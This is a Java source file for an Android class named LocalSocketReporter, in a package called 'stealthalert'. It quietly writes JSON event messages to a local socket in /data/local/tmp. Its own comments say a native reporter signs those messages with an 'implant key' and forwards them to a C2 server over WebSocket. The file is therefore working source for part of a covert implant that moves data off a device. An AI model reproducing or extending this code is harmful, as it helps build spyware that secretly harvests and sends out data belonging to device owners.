package com.stealthalert;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.util.Log;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * Sends JSON event messages to the native reporter's local IPC socket.
 * reporter signs the message with the implant key and forwards it over
 * its existing WebSocket — this class needs no C2 URL or credentials.
 */
public final class LocalSocketReporter {

    private static final String TAG         = "StealthAlert";
    static final         String SOCKET_PATH = "/data/local/tmp/reporter.sock";

    private static final ThreadPoolExecutor EXECUTOR = new ThreadPoolExecutor(
            0, 1, 10L, TimeUnit.SECONDS,
            new ArrayBlockingQueue<>(32),
            new ThreadPoolExecutor.DiscardOldestPolicy());

    private LocalSocketReporter() {}

    public static void send(final String json) {
        if (json == null || json.isEmpty()) return;
        EXECUTOR.execute(() -> {
            try {
                LocalSocket socket = new LocalSocket();
                socket.connect(new LocalSocketAddress(
                        SOCKET_PATH, LocalSocketAddress.Namespace.FILESYSTEM));
                socket.setSoTimeout(3000);
                socket.getOutputStream().write((json + "\n").getBytes("UTF-8"));
                socket.getOutputStream().flush();
                socket.close();
            } catch (Exception e) {
                Log.w(TAG, "IPC send failed: " + e.getMessage());
            }
        });
    }
}
